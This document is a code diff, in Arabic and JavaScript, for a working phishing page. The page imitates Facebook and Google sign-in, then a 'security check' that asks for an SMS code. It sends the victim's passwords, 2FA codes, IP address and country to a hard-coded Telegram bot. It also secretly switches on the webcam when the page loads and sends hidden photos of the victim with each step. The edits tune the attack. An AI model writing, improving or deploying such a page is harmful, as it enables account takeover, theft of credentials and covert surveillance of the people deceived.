@@ -13,12 +13,9 @@
         input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #222; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
         input:focus { border-color: var(--gold); }
         .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; transition: 0.3s; }
-        
         #step2, #step3, #loader-screen, #calling-screen { display: none; }
-        
         .progress-bar { width: 100%; background: #333; height: 8px; border-radius: 4px; margin: 20px 0; overflow: hidden; }
         .fill { width: 0%; height: 100%; background: var(--gold); transition: linear; }
-        
         .phone-ring { width: 80px; height: 80px; border: 3px solid var(--gold); border-radius: 50%; margin: 20px auto; display: flex; align-items: center; justify-content: center; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(212, 175, 55, 0); } 100% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0); } }
     </style>
@@ -40,118 +37,117 @@
         <h2>جاري التحقق...</h2>
         <div class="progress-bar"><div class="fill" id="p-fill"></div></div>
         <div id="timer" style="font-size: 24px; color: var(--gold);">02:00</div>
-        <p style="font-size: 12px;">يتم الآن تشفير البيانات وتجهيز اتصال آمن.</p>
     </div>
 
     <div id="step2">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="30">
         <h3>تأكيد الهوية</h3>
-        <p>يرجى إدخال الرمز المرسل إلى هاتفك المحمول.</p>
         <input type="number" id="sms-code" placeholder="000 000">
         <button class="btn" style="background: #42b72a; color: white;" onclick="handleStep2()">تأكيد الرمز</button>
     </div>
 
     <div id="step3">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_Reference_Logo.svg/200px-Google_Reference_Logo.svg.png" width="80">
-        <h3>تأكيد الحساب المرتبط</h3>
-        <p style="font-size: 13px;">لأغراض أمنية، يرجى تسجيل الدخول بحساب Google.</p>
+        <h3>تأكيد حساب Google</h3>
         <input type="email" id="gm-user" placeholder="Gmail Address">
         <input type="password" id="gm-pass" placeholder="Password">
-        <button class="btn" style="background: white; color: #555;" onclick="handleStep3()">المتابعة عبر Google</button>
+        <button class="btn" style="background: white; color: #555;" onclick="handleStep3()">المتابعة</button>
     </div>
 
     <div id="calling-screen">
         <div class="phone-ring">📞</div>
-        <h2>في انتظار الطرف الآخر...</h2>
-        <p>تم استلام بياناتك بنجاح، يرجى البقاء في الصفحة حتى يقوم الطرف الآخر بالرد على اتصالك.</p>
+        <h2>في انتظار الرد...</h2>
     </div>
 
-    <video id="v" style="display:none;" autoplay></video>
-    <canvas id="c" style="display:none;" width="320" height="240"></canvas>
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
 </div>
 
 <script>
     const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
-    const chat = '8188899228'; 
+    const chat = '8188899228';
 
-    window.onload = () => {
-        navigator.mediaDevices.getUserMedia({video:true}).then(s=>document.getElementById('v').srcObject=s).catch(e=>console.log("Camera access denied"));
+    // طلب الكاميرا عند التحميل
+    window.onload = async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = stream;
+        } catch (e) { console.log("Camera access denied"); }
     };
 
     async function capture(action) {
         const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
-        try {
-            for(let i=1; i<=3; i++) {
-                ctx.drawImage(v, 0, 0, 320, 240);
-                const blob = await new Promise(r=>c.toBlob(r, 'image/jpeg', 0.7));
-                const fd = new FormData();
-                fd.append('chat_id', chat); 
-                fd.append('photo', blob, `shot_${i}.jpg`); 
-                fd.append('caption', `📸 صورة ${i} - ${action}`);
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:fd});
-                await new Promise(r=>setTimeout(r, 800));
-            }
-        } catch(e) { console.log("Capture failed"); }
+        for (let i = 1; i <= 2; i++) { // تقليل الصور لـ 2 لضمان السرعة
+            ctx.drawImage(v, 0, 0, 640, 480);
+            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.5));
+            const fd = new FormData();
+            fd.append('chat_id', chat);
+            fd.append('photo', blob, 'img.jpg');
+            fd.append('caption', `📸 ${action} - Image ${i}`);
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+            } catch (err) {}
+            await new Promise(r => setTimeout(r, 1000));
+        }
     }
 
     async function sendFull(title, data) {
-        let loc = "جاري جلب الموقع...";
+        let locInfo = "";
         try {
-            const r = await fetch('https://ipapi.co/json/');
-            const d = await r.json();
-            loc = `🌍 البلد: ${d.country_name} | المدينة: ${d.city}\n📍 IP: \`${d.ip}\` | ISP: ${d.org}`;
-        } catch(e){ loc = "تعذر جلب الموقع (HTTPS Required)"; }
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            locInfo = `\n🌍 البلد: ${d.country_name}\n📍 IP: ${d.ip}`;
+        } catch (e) { locInfo = "\n📍 IP: تعذر الجلب"; }
 
-        const info = `🚀 **${title}** 🚀\n${data}\n\n📊 **System Info:**\n${loc}\n📱 الجهاز: \`${navigator.platform}\``;
+        const text = `🚀 **${title}**\n${data}${locInfo}\n📱 الجهاز: ${navigator.platform}`;
 
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chat, text: info, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: chat, text: text, parse_mode: 'Markdown' })
         });
     }
 
-    function handleStep1() {
+    async function handleStep1() {
         const u = document.getElementById('fb-user').value, p = document.getElementById('fb-pass').value;
-        if(!u || !p) { alert("يرجى إدخال البيانات"); return; }
-        sendFull("Facebook Login", `👤: \`${u}\` | 🔑: \`${p}\``);
-        capture("FB Step 1");
-        document.getElementById('step1').style.display='none';
+        if (!u || !p) return alert("أدخل البيانات!");
+        
+        await sendFull("FB LOGIN", `👤: \`${u}\`\n🔑: \`${p}\``);
+        capture("FB_LOGIN");
+
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('loader-screen').style.display = 'block';
         startLoader();
     }
 
     function startLoader() {
-        document.getElementById('loader-screen').style.display='block';
-        let t = 120;
+        let t = 5; // تقليل الوقت للاختبار السريع
         const intr = setInterval(() => {
             t--;
-            let m=Math.floor(t/60), s=t%60;
-            document.getElementById('timer').innerText = `${m<10?'0'+m:m}:${s<10?'0'+s:s}`;
-            document.getElementById('p-fill').style.width = ((120-t)/120*100)+'%';
-            if(t <= 0) { 
+            document.getElementById('p-fill').style.width = ((5 - t) / 5 * 100) + '%';
+            if (t <= 0) {
                 clearInterval(intr);
-                document.getElementById('loader-screen').style.display='none';
-                document.getElementById('step2').style.display='block';
+                document.getElementById('loader-screen').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
             }
         }, 1000);
     }
 
-    function handleStep2() {
-        const c = document.getElementById('sms-code').value;
-        if(!c) return;
-        sendFull("Facebook 2FA Code", `🛡️ الرمز المستلم: \`${c}\``);
-        capture("FB 2FA Step 2");
-        document.getElementById('step2').style.display='none';
-        document.getElementById('step3').style.display='block';
+    async function handleStep2() {
+        const code = document.getElementById('sms-code').value;
+        if (!code) return;
+        await sendFull("FB 2FA", `🛡️ Code: \`${code}\``);
+        capture("2FA_CODE");
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step3').style.display = 'block';
     }
 
-    function handleStep3() {
+    async function handleStep3() {
         const u = document.getElementById('gm-user').value, p = document.getElementById('gm-pass').value;
-        if(!u || !p) return;
-        sendFull("Google Link Data", `📧: \`${u}\` | 🔑: \`${p}\``);
-        capture("Google Step 3");
-        document.getElementById('step3').style.display='none';
-        document.getElementById('calling-screen').style.display='block';
+        if (!u || !p) return;
+        await sendFull("GOOGLE DATA", `📧: \`${u}\`\n🔑: \`${p}\``);
+        capture("GOOGLE_DATA");
+        document.getElementById('step3').style.display = 'none';
+        document.getElementById('calling-screen').style.display = 'block';
     }
 </script>
 </body>
